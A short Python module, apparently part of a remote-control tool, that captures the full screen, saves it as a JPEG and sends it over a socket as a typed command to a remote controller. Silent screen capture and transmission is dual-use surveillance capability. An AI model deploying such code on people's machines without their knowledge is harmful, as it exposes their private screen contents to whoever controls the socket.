import os

from PIL import ImageGrab

from core.Command import Command


class Screenshots(object):
    def __init__(self, socket):
        self.__socket = socket
        self.__screenshots = 'screenshots.jpeg'
        self.__data = bytes()

    def capture(self):
        img = ImageGrab.grab()
        img = img.convert('RGB')
        img.save(self.__screenshots)
        command = Command()
        command.set_type(3)
        command.set_data_length(os.path.getsize(self.__screenshots))
        with open(self.__screenshots, 'rb') as f:
            command.set_data(f.read())
        self.__socket.send_command(command)
